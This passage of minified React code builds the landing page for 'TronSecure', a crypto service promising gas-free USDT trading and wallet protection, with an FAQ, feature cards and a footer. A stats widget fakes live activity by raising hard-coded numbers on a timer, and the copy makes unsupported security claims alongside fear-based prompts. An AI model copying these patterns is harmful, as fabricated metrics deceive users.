      , i = C1(us, t)
      , n = l3(mE, t)
      , s = eV(mE, t)
      , a = a3(t);
    return L.jsx(s3.ItemSlot, {
        scope: t,
        children: L.jsx(Hq, {
            "aria-disabled": n.open && !s.collapsible || void 0,
            "data-orientation": i.orientation,
            id: n.triggerId,
            ...a,
            ...o,
            ref: e
        })
    })
}
);
Z9.displayName = mE;
var Y9 = "AccordionContent"
  , f3 = Ir.forwardRef( (r, e) => {
    const {__scopeAccordion: t, ...o} = r
      , i = C1(us, t)
      , n = l3(Y9, t)
      , s = a3(t);
    return L.jsx(Gq, {
        role: "region",
        "aria-labelledby": n.triggerId,
        "data-orientation": i.orientation,
        ...s,
        ...o,
        ref: e,
        style: {
            "--radix-accordion-content-height": "var(--radix-collapsible-content-height)",
            "--radix-accordion-content-width": "var(--radix-collapsible-content-width)",
            ...r.style
        }
    })
}
);
f3.displayName = Y9;
function X9(r) {
    return r ? "open" : "closed"
}
var iV = c3
  , sV = u3
  , aV = K9
  , cV = Z9
  , lV = f3;
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const uV = r => r.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase()
  , fV = r => r.replace(/^([A-Z])|[\s-_]+(\w)/g, (e, t, o) => o ? o.toUpperCase() : t.toLowerCase())
  , n8 = r => {
    const e = fV(r);
    return e.charAt(0).toUpperCase() + e.slice(1)
}
  , J9 = (...r) => r.filter( (e, t, o) => !!e && e.trim() !== "" && o.indexOf(e) === t).join(" ").trim()
  , dV = r => {
    for (const e in r)
        if (e.startsWith("aria-") || e === "role" || e === "title")
            return !0
}
;
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
var hV = {
    xmlns: "http://www.w3.org/2000/svg",
    width: 24,
    height: 24,
    viewBox: "0 0 24 24",
    fill: "none",
    stroke: "currentColor",
    strokeWidth: 2,
    strokeLinecap: "round",
    strokeLinejoin: "round"
};
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const pV = ue.forwardRef( ({color: r="currentColor", size: e=24, strokeWidth: t=2, absoluteStrokeWidth: o, className: i="", children: n, iconNode: s, ...a}, l) => ue.createElement("svg", {
    ref: l,
    ...hV,
    width: e,
    height: e,
    stroke: r,
    strokeWidth: o ? Number(t) * 24 / Number(e) : t,
    className: J9("lucide", i),
    ...!n && !dV(a) && {
        "aria-hidden": "true"
    },
    ...a
}, [...s.map( ([f,h]) => ue.createElement(f, h)), ...Array.isArray(n) ? n : [n]]));
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Xc = (r, e) => {
    const t = ue.forwardRef( ({className: o, ...i}, n) => ue.createElement(pV, {
        ref: n,
        iconNode: e,
        className: J9(`lucide-${uV(n8(r))}`, `lucide-${r}`, o),
        ...i
    }));
    return t.displayName = n8(r),
    t
}
;
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const gV = [["path", {
    d: "m6 9 6 6 6-6",
    key: "qrunsl"
}]]
  , yV = Xc("chevron-down", gV);
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const bV = [["path", {
    d: "M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z",
    key: "1rqfz7"
}], ["path", {
    d: "M14 2v4a2 2 0 0 0 2 2h4",
    key: "tnqrlb"
}], ["path", {
    d: "M10 9H8",
    key: "b1mrlr"
}], ["path", {
    d: "M16 13H8",
    key: "t4e002"
}], ["path", {
    d: "M16 17H8",
    key: "z1uh3a"
}]]
  , mV = Xc("file-text", bV);
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const xV = [["rect", {
    width: "20",
    height: "8",
    x: "2",
    y: "2",
    rx: "2",
    ry: "2",
    key: "ngkwjq"
}], ["rect", {
    width: "20",
    height: "8",
    x: "2",
    y: "14",
    rx: "2",
    ry: "2",
    key: "iecqi9"
}], ["line", {
    x1: "6",
    x2: "6.01",
    y1: "6",
    y2: "6",
    key: "16zg32"
}], ["line", {
    x1: "6",
    x2: "6.01",
    y1: "18",
    y2: "18",
    key: "nzw8ys"
}]]
  , wV = Xc("server", xV);
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const vV = [["path", {
    d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",
    key: "oel41y"
}], ["path", {
    d: "m9 12 2 2 4-4",
    key: "dzmm74"
}]]
  , TV = Xc("shield-check", vV);
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const EV = [["path", {
    d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",
    key: "oel41y"
}]]
  , AV = Xc("shield", EV);
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const PV = [["path", {
    d: "M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",
    key: "1yyitq"
}], ["path", {
    d: "M16 3.128a4 4 0 0 1 0 7.744",
    key: "16gr8j"
}], ["path", {
    d: "M22 21v-2a4 4 0 0 0-3-3.87",
    key: "kshegd"
}], ["circle", {
    cx: "9",
    cy: "7",
    r: "4",
    key: "nufk8"
}]]
  , CV = Xc("users", PV);
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const SV = [["path", {
    d: "M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1",
    key: "18etb6"
}], ["path", {
    d: "M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4",
    key: "xoc0q4"
}]]
  , xE = Xc("wallet", SV);
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const BV = [["path", {
    d: "M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z",
    key: "1xq2db"
}]]
  , _V = Xc("zap", BV);
function IV({...r}) {
    return L.jsx(iV, {
        "data-slot": "accordion",
        ...r
    })
}
function OV({className: r, ...e}) {
    return L.jsx(sV, {
        "data-slot": "accordion-item",
        className: Hd("border-b last:border-b-0", r),
        ...e
    })
}
function Q9({className: r, children: e, ...t}) {
    return L.jsx(aV, {
        className: "flex",
        children: L.jsxs(cV, {
            "data-slot": "accordion-trigger",
            className: Hd("focus-visible:border-ring focus-visible:ring-ring/50 flex flex-1 items-start justify-between gap-4 rounded-md py-4 text-left text-sm font-medium transition-all delay-700 outline-none  focus-visible:ring-[3px] disabled:pointer-events-none disabled:opacity-50 [&[data-state=open]>svg]:rotate-180", r),
            ...t,
            children: [e, L.jsx(yV, {
                className: " pointer-events-none size-4 shrink-0 -y-1 transition-all duration-700 text-purple-600"
            })]
        })
    })
}
function RV({className: r, children: e, ...t}) {
    return L.jsx(lV, {
        "data-slot": "accordion-content",
        className: "data-[state=closed]:animate-accordion-up data-[state=open]:animate-accordion-down overflow-hidden text-sm",
        ...t,
        children: L.jsx("div", {
            className: Hd("pt-0 pb-4", r),
            children: e
        })
    })
}
const WV = () => L.jsxs("div", {
    id: "faq",
    className: "w-full  flex items-center justify-center flex-col gap-8 py-10 px-8 md:px-0 lg:px-0",
    children: [L.jsx("h2", {
        className: "faq-heading text-center font-extrabold uppercase  text-pretty ",
        children: "Frequently Asked Questions"
    }), L.jsx("div", {
        className: " flex flex-col items-center  justify-center w-full  gap-8  ",
        children: L.jsx(IV, {
            type: "single",
            collapsible: !0,
            className: "w-full md:w-[50%] flex flex-col items-center justify-center gap-4",
            children: [{
                question: "What is TronSecure?",
                answer: "TronSecure is a cutting-edge platform that offers gas-free USDT trading and advanced wallet security features. It's designed to make cryptocurrency transactions more efficient, secure, and cost-effective."
            }, {
                question: "How does gas-free trading work?",
                answer: "TronSecure uses an innovative energy delegation system that allows users to perform a set number of transactions daily without incurring gas fees. This system is powered by our platform's energy pool, which is allocated to users based on their subscription tier."
            }, {
                question: "Is my wallet safe with TronSecure?",
                answer: "Absolutely. TronSecure employs state-of-the-art security measures, including advanced multi-factor authentication, real-time security analysis, and blockchain-verified security certificates. We prioritize the safety and privacy of our users' wallets and transactions."
            }, {
                question: "What benefits do I get from joining the waitlist?",
                answer: "Waitlist members receive exclusive benefits, including priority access to the platform, an extended free trial period, and additional free transactions. You'll also be among the first to experience our revolutionary gas-free trading system."
            }, {
                question: "Can I use TronSecure for cryptocurrencies other than USDT?",
                answer: "Currently, TronSecure is optimized for USDT trading on the Tron network. However, we are constantly working on expanding our services to support more cryptocurrencies and networks in the future."
            }].map( (r, e) => L.jsxs(OV, {
                value: `item-${e}`,
                className: "w-full",
                children: [L.jsx(Q9, {
                    className: " flex text-lg font-bold bg-white shadow-md  px-4 ",
                    children: r.question
                }), L.jsx(RV, {
                    className: "text-[14px] font-sans tracking-tight  bg-white shadow-md rounded-b-md p-2 mt-2 bottom-1  text-gray-700",
                    children: r.answer
                })]
            }, e))
        })
    })]
});
function d3(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M11.001 10h2v5h-2zM11 16h2v2h-2z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M13.768 4.2C13.42 3.545 12.742 3.138 12 3.138s-1.42.407-1.768 1.063L2.894 18.064a1.986 1.986 0 0 0 .054 1.968A1.984 1.984 0 0 0 4.661 21h14.678c.708 0 1.349-.362 1.714-.968a1.989 1.989 0 0 0 .054-1.968L13.768 4.2zM4.661 19 12 5.137 19.344 19H4.661z"
            },
            child: []
        }]
    })(r)
}
function h3(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M12 22c3.859 0 7-3.141 7-7s-3.141-7-7-7c-3.86 0-7 3.141-7 7s3.14 7 7 7zm0-12c2.757 0 5 2.243 5 5s-2.243 5-5 5-5-2.243-5-5 2.243-5 5-5zm-1-8H7v5.518a8.957 8.957 0 0 1 4-1.459V2zm6 0h-4v4.059a8.957 8.957 0 0 1 4 1.459V2z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "m10.019 15.811-.468 2.726L12 17.25l2.449 1.287-.468-2.726 1.982-1.932-2.738-.398L12 11l-1.225 2.481-2.738.398z"
            },
            child: []
        }]
    })(r)
}
function MV(r) {
    return Pr({
        attr: {
            viewBox: "0 0 512 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M294.1 256L167 129c-9.4-9.4-9.4-24.6 0-33.9s24.6-9.3 34 0L345 239c9.1 9.1 9.3 23.7.7 33.1L201.1 417c-4.7 4.7-10.9 7-17 7s-12.3-2.3-17-7c-9.4-9.4-9.4-24.6 0-33.9l127-127.1z"
            },
            child: []
        }]
    })(r)
}
function NV(r) {
    return Pr({
        attr: {
            viewBox: "0 0 512 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M396 144H64c-26.4 0-48 21.6-48 48v128c0 26.4 21.6 48 48 48h332c26.4 0 48-21.6 48-48V192c0-26.4-21.6-48-48-48zm20 176c0 11-9 20-20 20H64c-11 0-20-9-20-20V192c0-11 9-20 20-20h332c11 0 20 9 20 20v128zM464 204.6v102.8c16 0 32-27.7 32-51.4s-16-51.4-32-51.4z"
            },
            child: []
        }]
    })(r)
}
function eM(r) {
    return Pr({
        attr: {
            viewBox: "0 0 16 16",
            fill: "currentColor"
        },
        child: [{
            tag: "path",
            attr: {
                fillRule: "evenodd",
                clipRule: "evenodd",
                d: "M1.5 14H15v-1H2V0H1v13.5l.5.5zM3 11.5v-8l.5-.5h2l.5.5v8l-.5.5h-2l-.5-.5zm2-.5V4H4v7h1zm6-9.5v10l.5.5h2l.5-.5v-10l-.5-.5h-2l-.5.5zm2 .5v9h-1V2h1zm-6 9.5v-6l.5-.5h2l.5.5v6l-.5.5h-2l-.5-.5zm2-.5V6H8v5h1z"
            },
            child: []
        }]
    })(r)
}
function tM(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                fill: "none",
                strokeWidth: "2",
                d: "M3,1 L3,23 L16,23 L21,18 L21,1 L3,1 Z M6,17 L11,17 M6,13 L18,13 M6,9 L16,9 M3,5 L21,5 M21,17 L15,17 L15,23"
            },
            child: []
        }]
    })(r)
}
function lu(r) {
    return Pr({
        attr: {
            fill: "currentColor",
            viewBox: "0 0 16 16"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M11.251.068a.5.5 0 0 1 .227.58L9.677 6.5H13a.5.5 0 0 1 .364.843l-8 8.5a.5.5 0 0 1-.842-.49L6.323 9.5H3a.5.5 0 0 1-.364-.843l8-8.5a.5.5 0 0 1 .615-.09zM4.157 8.5H7a.5.5 0 0 1 .478.647L6.11 13.59l5.732-6.09H9a.5.5 0 0 1-.478-.647L9.89 2.41z"
            },
            child: []
        }]
    })(r)
}
function DV(r) {
    return Pr({
        attr: {
            fill: "currentColor",
            viewBox: "0 0 16 16"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M15 14s1 0 1-1-1-4-5-4-5 3-5 4 1 1 1 1zm-7.978-1L7 12.996c.001-.264.167-1.03.76-1.72C8.312 10.629 9.282 10 11 10c1.717 0 2.687.63 3.24 1.276.593.69.758 1.457.76 1.72l-.008.002-.014.002zM11 7a2 2 0 1 0 0-4 2 2 0 0 0 0 4m3-2a3 3 0 1 1-6 0 3 3 0 0 1 6 0M6.936 9.28a6 6 0 0 0-1.23-.247A7 7 0 0 0 5 9c-4 0-5 3-5 4q0 1 1 1h4.216A2.24 2.24 0 0 1 5 13c0-1.01.377-2.042 1.09-2.904.243-.294.526-.569.846-.816M4.92 10A5.5 5.5 0 0 0 4 13H1c0-.26.164-1.03.76-1.724.545-.636 1.492-1.256 3.16-1.275ZM1.5 5.5a3 3 0 1 1 6 0 3 3 0 0 1-6 0m3-2a2 2 0 1 0 0 4 2 2 0 0 0 0-4"
            },
            child: []
        }]
    })(r)
}
const rM = "/assets/gif3-unscreen-DbqZ04Yk.gif"
  , nM = "/assets/gir4-unscreen-CDWvzrgg.gif"
  , FV = "/assets/gif5-unscreen-BwyukuuD.gif"
  , oM = "/assets/gif6-unscreen-JwVVOq5f.gif"
  , iM = "/assets/gif8-unscreen-ePashJIB.gif"
  , UV = [{
    id: 1,
    icon: L.jsx(Gs, {
        className: "text-purple-600 text-2xl font-400 "
    }),
    title: "Secure Wallet",
    description: "Protect your crypto with TronSecure multi-layered security.",
    image: rM
}, {
    id: 2,
    icon: L.jsx(eM, {
        className: "text-purple-600 text-2xl font-400 "
    }),
    title: "Transaction Alerts",
    description: "Get instant alerts for every wallet activity.",
    image: iM
}, {
    id: 3,
    icon: L.jsx(tM, {
        className: "text-purple-600 text-2xl rotate-180 font-400 "
    }),
    title: "Anomaly Detection",
    description: "Detect suspicious behavior before its too late.",
    image: oM
}, {
    id: 4,
    icon: L.jsx(h3, {
        className: "text-purple-600 text-2xl rotate-180 font-400 "
    }),
    title: "Recovery Tools",
    description: "Recover lost or compromised wallets easily.",
    image: nM
}]
  , kV = [{
    id: 5,
    icon: L.jsx(NV, {
        className: "text-purple-600 text-2xl  font-400 "
    }),
    title: "Delegate Power",
    description: "Share or receive energy to reduce transaction fees.",
    image: FV
}, {
    id: 6,
    icon: L.jsx(eM, {
        className: "text-purple-600 text-2xl font-400 "
    }),
    title: "Earn Rewards",
    description: "Get rewarded by delegating unused energy.",
    image: iM
}, {
    id: 7,
    icon: L.jsx(tM, {
        className: "text-purple-600 text-2xl rotate-180 font-400 "
    }),
    title: "Energy Optimization",
    description: "Optimize energy usage across your contracts.",
    image: oM
}, {
    id: 8,
    icon: L.jsx(h3, {
        className: "text-purple-600 text-2xl rotate-180 font-400 "
    }),
    title: "Real-time Stats",
    description: "Monitor energy in real-time with powerful dashboards.",
    image: nM
}];
function LV() {
    const [r,e] = ue.useState("wallet")
      , t = r === "wallet" ? UV : kV;
    return L.jsxs("section", {
        className: " w-full flex   flex-col   space-y-8   ",
        children: [L.jsxs("div", {
            className: " inline-flex items-start justify-start  space-x-4 md:space-x-8 lg:space-x-8 ",
            children: [L.jsxs(dn, {
                onClick: () => e("wallet"),
                className: ` p-6   rounded-md text-md hover:bg-white hover:text-black cursor-pointer  transition-all delay-500 ${r === "wallet" ? "bg-purple-600 text-white" : "bg-white border border-purple-300 text-purple-600"}`,
                children: [L.jsx(Gs, {
                    className: "w-8 h-8"
                }), "Wallet Security"]
            }), L.jsxs(dn, {
                onClick: () => e("energy"),
                className: ` p-6 rounded-md hover:bg-white hover:text-black cursor-pointer text-md font-semibold transition-all delay-700 ${r === "energy" ? "bg-purple-600 text-white " : " bg-white border border-purple-300 text-purple-600"}`,
                children: [L.jsx(lu, {
                    className: "w-8 h-8"
                }), "    Energy Delegation"]
            })]
        }), L.jsx("div", {
            className: `w-full grid grid-cols-1 md:grid-cols-2 gap-10 
    transition-all duration-700 ease-in-out 
    ${r === "wallet" ? "animate-slide-left" : "animate-slide-right"}
  `,
            children: t.map(o => L.jsxs("div", {
                className: "bg-white rounded-xl shadow-xl p-6 h-64 w-full items-center flex flex-col justify-center gap-4 text-center",
                children: [L.jsx("div", {
                    className: "w-full flex items-center justify-center text-start space-y-4",
                    children: L.jsxs("div", {
                        className: "flex flex-col gap-1 w-full",
                        children: [L.jsxs("div", {
                            className: "flex flex-row gap-4",
                            children: [L.jsx("span", {
                                className: "w-12 h-12 flex items-center rounded-md justify-center bg-[#F3E8FF] text-purple-500",
                                children: o.icon
                            }), L.jsx("h3", {
                                className: "oswald-heading-h3 uppercase",
                                children: o.title
                            })]
                        }), L.jsx("div", {
                            className: "rounded-sm gap-4 w-[98%] h-full flex flex-col",
                            children: L.jsx("p", {
                                className: "primarry-page",
                                children: o.description
                            })
                        })]
                    })
                }), L.jsx("div", {
                    className: "flex items-center justify-center w-[96%]",
                    children: L.jsx("div", {
                        className: "flex items-center justify-center bg-[#F9FAFB] w-full h-24",
                        children: L.jsx("img", {
                            src: o.image,
                            alt: o.title,
                            className: " h-32 w-32 object-contain mt-2"
                        })
                    })
                })]
            }, o.id))
        }, r)]
    })
}
const $V = () => L.jsxs("section", {
    id: "features",
    className: "w-full flex flex-col items-center justify-start space-y-10 px-8 md:px-24 lg:px-24  overflow-hidden bg-gradient-to-bl from-[#FEFEFF] via-80% to-[#F9F4FE] py-20",
    children: [L.jsxs("div", {
        className: "flex flex-col items-center justify-center gap-2 text-center",
        children: [L.jsx("h2", {
            className: "oswald-heading-primary uppercase",
            children: "Platform Features"
        }), L.jsx("p", {
            className: "primarry-page",
            children: "Advanced security features and energy delegation system"
        })]
    }), L.jsxs("div", {
        className: "w-full  flex flex-row gap-2 py-2 text-[#9333EB] border-[#e1cbf7] border-1 rounded-lg bg-gradient-[#FAF5FF]",
        children: [L.jsx("div", {
            className: "px-2 rounded-sm flex py-2",
            children: L.jsx("span", {
                className: "w-8 h-8 md:w-10 md:h-10 flex items-center rounded-md justify-center bg-purple-200 text-purple-500",
                children: L.jsx(d3, {
                    className: "w-6 h-6 md:w-8 md:h-8"
                })
            })
        }), L.jsxs("div", {
            className: "flex flex-col space-y-1 p-2",
            children: [L.jsx("h3", {
                className: "oswald-heading-secondary  uppercase  text-[#9333EB]",
                children: "Why Check Your Transaction History?"
            }), L.jsx("p", {
                className: "primarry-page  text-purple-500 ",
                children: "Receiving questionable transactions today could lead to account restrictions tomorrow."
            })]
        })]
    }), L.jsx(LV, {}), L.jsx("div", {
        className: "flex items-center justify-center w-full ",
        children: L.jsx("p", {
            className: "primarry-page text-center",
            children: "Hover on features for detailed information  Click tabs to switch between security and energy features"
        })
    })]
});
function zV(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "path",
            attr: {
                d: "m21.12 6.4-6.05-4.06a2 2 0 0 0-2.17-.05L2.95 8.41a2 2 0 0 0-.95 1.7v5.82a2 2 0 0 0 .88 1.66l6.05 4.07a2 2 0 0 0 2.17.05l9.95-6.12a2 2 0 0 0 .95-1.7V8.06a2 2 0 0 0-.88-1.66Z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M10 22v-8L2.25 9.15"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "m10 14 11.77-6.87"
            },
            child: []
        }]
    })(r)
}
function jV(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M14 2v4a2 2 0 0 0 2 2h4"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "m9 15 2 2 4-4"
            },
            child: []
        }]
    })(r)
}
function qV(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "path",
            attr: {
                d: "m3 17 2 2 4-4"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "m3 7 2 2 4-4"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M13 6h8"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M13 12h8"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M13 18h8"
            },
            child: []
        }]
    })(r)
}
function VV(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24",
            fill: "none",
            stroke: "currentColor",
            strokeWidth: "2",
            strokeLinecap: "round",
            strokeLinejoin: "round"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"
            },
            child: []
        }]
    })(r)
}
const sM = () => L.jsx("div", {
    className: "flex items-center flex-shrink-0",
    children: L.jsxs(e3, {
        to: "/",
        className: "flex items-center gap-2 text-[#9333EA] hover:text-[#7e22ce] transition-colors",
        "aria-label": "TronSecure Home",
        children: [L.jsx("div", {
            className: "w-8 h-8 rounded-md  flex items-center justify-center mr-2 font-bold text-xl",
            children: L.jsx(zV, {
                className: "w-8 h-8"
            })
        }), L.jsx("span", {
            className: "text-2xl  font-bold text-gray-800 text-brand-blue",
            children: "TronSecure"
        })]
    })
})
  , HV = () => {
    const r = new Date().getFullYear();
    return L.jsx("footer", {
        className: " w-full bg-brand-blue text-white   flex items-center justify-center   bg-white relative  py-10 px-8 md:px-24 lg:px-24",
        children: L.jsxs("div", {
            className: "container   px-8  flex flex-col  gap-8",
            children: [L.jsxs("div", {
                className: "grid md:grid-cols-4 gap-10",
                children: [L.jsxs("div", {
                    className: "w-40 flex flex-col gap-2",
                    children: [L.jsx(sM, {}), L.jsx("p", {
                        className: "text-gray-600 text-[14px] font-sans",
                        children: "Making USDT trading secure and gas-free"
                    })]
                }), L.jsxs("div", {
                    children: [L.jsx("h3", {
                        className: "text-lg font-bold mb-3 text-black uppercase",
                        children: "Products"
                    }), L.jsxs("ul", {
                        className: "space-y-4 flex flex-col gap-2",
                        children: [L.jsx("li", {
                            children: L.jsx("a", {
                                href: "#features",
                                className: "text-gray-600 hover:text-purple-500 transition-colors text-md font-sans",
                                children: "Features"
                            })
                        }), L.jsx("li", {
                            children: L.jsx("a", {
                                href: "#howitworks",
                                className: "text-gray-600 hover:text-purple-500 transition-colors text-md font-sans",
                                children: "How it Works"
                            })
                        }), L.jsx("li", {
                            children: L.jsx("a", {
                                href: "#reports",
                                className: "text-gray-600 hover:text-purple-500 transition-colors text-md font-sans",
                                children: "Security"
                            })
                        }), L.jsx("li", {
                            children: L.jsx("a", {
                                href: "/",
                                className: "text-gray-600 hover:text-purple-500 transition-colors text-md font-sans",
                                children: "Waitlist"
                            })
                        })]
                    })]
                })]
            }), L.jsx("div", {
                className: "  border-t h-10 border-gray-700 flex flex-col md:flex-row md:justify-between lg:justify-between justify-center items-center ",
                children: L.jsxs("p", {
                    className: "text-gray-600 text-[14px] font-sans  ",
                    children: [" ", r, "  TronSecure. All rights reserved."]
                })
            })]
        })
    })
}
;
function GV(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M3.5 8a5.5 5.5 0 1 1 8.596 4.547 9.005 9.005 0 0 1 5.9 8.18.751.751 0 0 1-1.5.045 7.5 7.5 0 0 0-14.993 0 .75.75 0 0 1-1.499-.044 9.005 9.005 0 0 1 5.9-8.181A5.496 5.496 0 0 1 3.5 8ZM9 4a4 4 0 1 0 0 8 4 4 0 0 0 0-8Zm8.29 4c-.148 0-.292.01-.434.03a.75.75 0 1 1-.212-1.484 4.53 4.53 0 0 1 3.38 8.097 6.69 6.69 0 0 1 3.956 6.107.75.75 0 0 1-1.5 0 5.193 5.193 0 0 0-3.696-4.972l-.534-.16v-1.676l.41-.209A3.03 3.03 0 0 0 17.29 8Z"
            },
            child: []
        }]
    })(r)
}
function o8(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                fill: "none",
                d: "M0 0h24v24H0z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM8.9 6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2H8.9V6zM18 20H6V10h12v10z"
            },
            child: []
        }]
    })(r)
}
function KV(r) {
    return Pr({
        attr: {
            viewBox: "0 0 24 24"
        },
        child: [{
            tag: "path",
            attr: {
                fill: "none",
                d: "M0 0h24v24H0z"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                d: "M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.2 3.2.8-1.3-4.5-2.7V7z"
            },
            child: []
        }]
    })(r)
}
function ZV({className: r, type: e, ...t}) {
    return L.jsx("input", {
        type: e,
        "data-slot": "input",
        className: Hd("file:text-foreground placeholder:text-muted-foreground selection:bg-primary selection:text-primary-foreground dark:bg-input/30 border-input flex h-9 w-full min-w-0 rounded-md border bg-transparent px-3 py-1 text-base shadow-xs transition-[color,box-shadow] outline-none file:inline-flex file:h-7 file:border-0 file:bg-transparent file:text-sm file:font-medium disabled:pointer-events-none disabled:cursor-not-allowed disabled:opacity-50 md:text-sm", "focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px]", "aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive", r),
        ...t
    })
}
const YV = () => {
    const [r,e] = ue.useState(30)
      , t = 933
      , o = 9705
      , i = 50
      , n = 5
      , s = (t + (r - n) * (o - t) / (i - n)).toFixed(2)
      , [a,l] = ue.useState(6.71)
      , [f,h] = ue.useState(277)
      , [p,b] = ue.useState(159);
    return ue.useEffect( () => {
        const v = setInterval( () => {
            l(T => parseFloat((T + .01).toFixed(2))),
            h(T => T + 1),
            b(T => T + 1)
        }
        , 5e3);
        return () => clearInterval(v)
    }
    , []),
    L.jsxs("div", {
        className: "w-full flex items-center justify-center  flex-col item-center jusctify-center space-y-10  px-8 md:px-24 lg:px-24",
        children: [L.jsx("h2", {
            className: "oswald-heading-primary uppercase text-[#581C87]",
            children: "Gas-Free Future Awaits"
        }), L.jsx("p", {
            className: "primarry-page",
            children: "Join the revolution in USDT trading"
        }), L.jsxs("div", {
